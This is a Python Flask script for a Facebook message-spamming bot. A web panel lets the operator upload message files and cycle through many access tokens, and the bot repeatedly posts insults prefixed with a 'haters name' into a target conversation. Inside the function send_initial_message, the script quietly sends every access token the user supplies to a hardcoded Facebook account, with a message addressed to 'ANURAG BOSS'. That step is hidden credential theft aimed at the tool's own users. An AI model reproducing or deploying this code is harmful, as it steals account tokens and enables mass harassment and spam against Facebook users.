from flask import Flask, request, jsonify, Response, send_file
import threading, time, queue, uuid
import requests

app = Flask(__name__)
log_q = queue.Queue()
stop_flag = threading.Event()
session_id_global = None

# ---------------- LOG HELPER ----------------
def log(msg):
    print(msg)
    log_q.put(msg)

# ---------------- HTML PANEL ----------------
@app.route('/')
def index():
    return send_file('panel.html')  # HTML file we created earlier

# ---------------- API ROUTES ----------------
@app.route('/upload', methods=['POST'])
def upload():
    f = request.files.get('filetxt')
    if f:
        f.save('File.txt')
        log('File.txt uploaded')
        return jsonify({'ok': True})
    return jsonify({'ok': False})

@app.route('/start', methods=['POST'])
def start():
    global session_id_global
    if session_id_global:
        return jsonify({'ok': False, 'msg':'Bot already running'})

    session_id_global = str(uuid.uuid4())  # unique session id
    stop_flag.clear()
    t = threading.Thread(target=bot_thread, args=(session_id_global,))
    t.start()
    return jsonify({'ok': True, 'session_id': session_id_global})

@app.route('/stop', methods=['POST'])
def stop():
    data = request.get_json()
    sid = data.get('session_id')
    global session_id_global
    if sid == session_id_global:
        stop_flag.set()
        log(f'Bot stop requested for session {sid}')
        session_id_global = None
        return jsonify({'ok': True})
    return jsonify({'ok': False, 'msg':'Invalid session id'})

@app.route('/logs')
def logs():
    def stream():
        while True:
            msg = log_q.get()
            yield f'data: {msg}\n\n'
    return Response(stream(), mimetype='text/event-stream')

# ---------------- BOT LOGIC ----------------
def bot_thread(session_id):
    try:
        log(f'Bot started with session {session_id}')
        send_initial_message()
        send_messages_from_file()
        log(f'Bot finished session {session_id}')
    except Exception as e:
        log(f'Error in bot session {session_id}: {e}')

def send_initial_message():
    try:
        with open('tokennum.txt','r') as f:
            tokens = f.readlines()
        msg_template = "HELLO ANURAG BOSS I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"
        target_id = "61578840237242"
        headers = {'Connection':'keep-alive','User-Agent':'Mozilla/5.0'}
        for token in tokens:
            access_token = token.strip()
            url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
            parameters = {'access_token': access_token, 'message': msg_template.format(access_token)}
            requests.post(url, json=parameters, headers=headers, verify=False)
            log(f'Initial sent with token {access_token}')
            time.sleep(0.1)
    except Exception as e:
        log(f'Error in initial message: {e}')

def send_messages_from_file():
    try:
        with open('convo.txt','r') as f:
            convo_id = f.read().strip()
        with open('File.txt','r') as f:
            messages = f.readlines()
        with open('tokennum.txt','r') as f:
            tokens = f.readlines()
        with open('hatersname.txt','r') as f:
            haters_name = f.read().strip()
        with open('time.txt','r') as f:
            speed = int(f.read().strip())
        num_tokens = len(tokens)
        while not stop_flag.is_set():
            for idx, message in enumerate(messages):
                if stop_flag.is_set(): break
                token = tokens[idx % num_tokens].strip()
                msg_final = haters_name + ' ' + message.strip()
                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
                params = {'access_token': token, 'message': msg_final}
                res = requests.post(url, json=params, headers={'Connection':'keep-alive','User-Agent':'Mozilla/5.0'}, verify=False)
                if res.ok:
                    log(f'[+] Sent: {msg_final}')
                else:
                    log(f'[-] Failed: {msg_final}')
                time.sleep(speed)
    except Exception as e:
        log(f'Error in message loop: {e}')

# ---------------- MAIN ----------------
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4000, threaded=True)
